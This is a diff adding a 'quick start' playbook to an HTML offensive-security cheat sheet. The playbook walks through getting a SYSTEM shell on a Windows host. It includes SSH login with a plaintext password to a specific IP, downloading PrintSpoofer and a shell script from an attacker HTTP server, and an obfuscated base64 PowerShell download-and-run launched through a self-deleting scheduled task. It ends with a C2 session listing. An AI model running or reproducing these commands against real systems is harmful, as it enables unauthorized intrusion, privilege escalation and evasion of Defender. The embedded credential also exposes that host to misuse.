@@ -227,6 +227,44 @@
   <div class="sub">CSEC OPS // PERSONAL CHEAT SHEET</div>
 </div>
 
+<!-- QUICK START PLAYBOOK -->
+<div style="max-width:800px;margin:0 auto 24px;background:#0d1117;border:2px solid #00ff41;padding:20px;font-size:0.75rem;">
+  <div style="color:#00ff41;font-size:1rem;margin-bottom:12px;text-shadow:0 0 10px rgba(0,255,65,0.5);">
+    QUICK START: GET SYSTEM SHELL
+  </div>
+
+  <div style="color:#ffee00;margin:16px 0 8px;font-weight:bold;">STEP 1: START C2 LISTENER (VPS)</div>
+  <pre style="background:#000;padding:10px;color:#00f0ff;overflow-x:auto;margin-bottom:12px;">tmux attach -t c2
+# Or start fresh: python3 /opt/c2_multi.py</pre>
+
+  <div style="color:#ffee00;margin:16px 0 8px;font-weight:bold;">STEP 2: START HTTP SERVER (VPS)</div>
+  <pre style="background:#000;padding:10px;color:#00f0ff;overflow-x:auto;margin-bottom:12px;">cd /opt && python3 -m http.server 8889</pre>
+
+  <div style="color:#ffee00;margin:16px 0 8px;font-weight:bold;">STEP 3: CONNECT TO TARGET</div>
+  <pre style="background:#000;padding:10px;color:#00f0ff;overflow-x:auto;margin-bottom:12px;">sshpass -p 'Mypassword1!' ssh adminvm1@4.200.69.210</pre>
+
+  <div style="color:#ff2a6d;margin:16px 0 8px;font-weight:bold;">STEP 4A: IF DEFENDER HAS EXCLUSIONS (Check: Get-MpPreference | Select ExclusionPath)</div>
+  <pre style="background:#000;padding:10px;color:#00f0ff;overflow-x:auto;margin-bottom:12px;"># Download tools
+IWR http://168.144.166.97:8889/PrintSpoofer.exe -OutFile C:\Windows\Temp\ps.exe
+IWR http://168.144.166.97:8889/sys_shell.ps1 -OutFile C:\Windows\Temp\sys.ps1
+
+# Get SYSTEM
+C:\Windows\Temp\ps.exe -i -c "powershell -ep bypass -f C:\Windows\Temp\sys.ps1"</pre>
+
+  <div style="color:#ff2a6d;margin:16px 0 8px;font-weight:bold;">STEP 4B: IF DEFENDER HARDENED (No Exclusions) - Use Scheduled Task</div>
+  <pre style="background:#000;padding:10px;color:#00f0ff;overflow-x:auto;margin-bottom:12px;"># Create and run task as SYSTEM (run in PowerShell)
+$b = "SQBFAFgAKABJAFcAUgAgAGgAdAB0AHAAOgAvAC8AMQA2ADgALgAxADQANAAuADEANgA2AC4AOQA3ADoAOAA4ADgAOQAvAHMAeQBzAF8AcwBoAGUAbABsAC4AcABzADEAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkA"
+schtasks /create /tn Upd /tr "powershell -ep bypass -enc $b" /sc once /st 00:00 /ru SYSTEM /f
+schtasks /run /tn Upd
+schtasks /delete /tn Upd /f</pre>
+
+  <div style="color:#00ff41;margin:16px 0 8px;font-weight:bold;">STEP 5: USE SHELL (Back on VPS C2)</div>
+  <pre style="background:#000;padding:10px;color:#00f0ff;overflow-x:auto;">sessions       # List all shells
+use 1          # Connect to session 1
+whoami         # Should show: nt authority\system</pre>
+</div>
+<!-- END QUICK START -->
+
 <div class="search-wrap">
   <input type="text" id="search" placeholder="Search commands... (e.g. screen, token, amsi)">
 </div>
